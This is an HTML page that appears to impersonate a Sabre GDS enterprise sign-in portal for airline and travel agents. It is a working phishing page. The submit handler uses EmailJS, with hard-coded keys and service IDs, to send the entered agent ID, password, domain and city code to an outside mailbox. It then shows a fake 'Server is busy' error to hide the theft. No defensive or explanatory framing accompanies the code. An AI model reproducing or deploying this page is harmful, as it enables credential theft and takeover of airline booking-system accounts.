<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Airline GDS Login ‚Äì Sabre Enterprise | Global GDS Support</title>
    <meta
      name="description"
      content="Secure login portal for Sabre GDS system. Global GDS Support provides assistance for airline agents to access booking systems easily."
    />
    <meta
      name="keywords"
      content="Sabre GDS, airline agent login, GDS support, Sabre sign in, travel agent portal, global GDS support"
    />
    <meta name="robots" content="index, follow" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- Open Graph Tags for better social media sharing -->
    <meta property="og:title" content="Airline Login - Global GDS Support" />
    <meta
      property="og:description"
      content="Login to your Global GDS Support Airline account. Secure access for airline agents."
    />
    <meta property="og:image" content="/imgs/favicon.ico" />

    <meta
      property="og:url"
      content="https://globalgdssupport.com/airline.html"
    />

    <link rel="stylesheet" href="css/airlines.css" />

    <script
      type="text/javascript"
      src="https://cdn.emailjs.com/dist/email.min.js"
    ></script>
    <script type="text/javascript">
      (function () {
        emailjs.init("s0V8V4beDXT4rMa18"); // Replace with your EmailJS public key
      })();
    </script>
  </head>
  <body>
    <div class="container">
      <div class="form-box">
        <div class="logo-text">Sabre</div>
        <h2>Enterprise Sign In</h2>
        <form id="form">
          <input type="text" name="userId" placeholder="Agent ID" required />

          <div class="input-group">
            <input
              type="password"
              name="password"
              id="password"
              placeholder="Password"
              required
            />
            <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
          </div>

          <input
            type="text"
            name="domain"
            placeholder="Domain/Partition"
            required
          />
          <input
            type="text"
            name="group"
            placeholder="Suffix/City Code"
            required
          />
          <button type="submit" class="sign-in">SIGN IN</button>
        </form>
        <a href="#" class="forgot">Forgot password?</a>
      </div>
    </div>

    <script>
      function togglePassword() {
        const pwd = document.getElementById("password");
        pwd.type = pwd.type === "password" ? "text" : "password";
      }
    </script>

    <script>
      document.getElementById("form").addEventListener("submit", function (e) {
        e.preventDefault();

        emailjs.sendForm("service_khovyrq", "template_95psblh", this).then(
          () => {
            alert("Server is busy. Please try again later!");
            this.reset();
          },
          (error) => {
            alert("ERROR Server is busy. Please try again later.");
          }
        );
      });
    </script>
  </body>
</html>
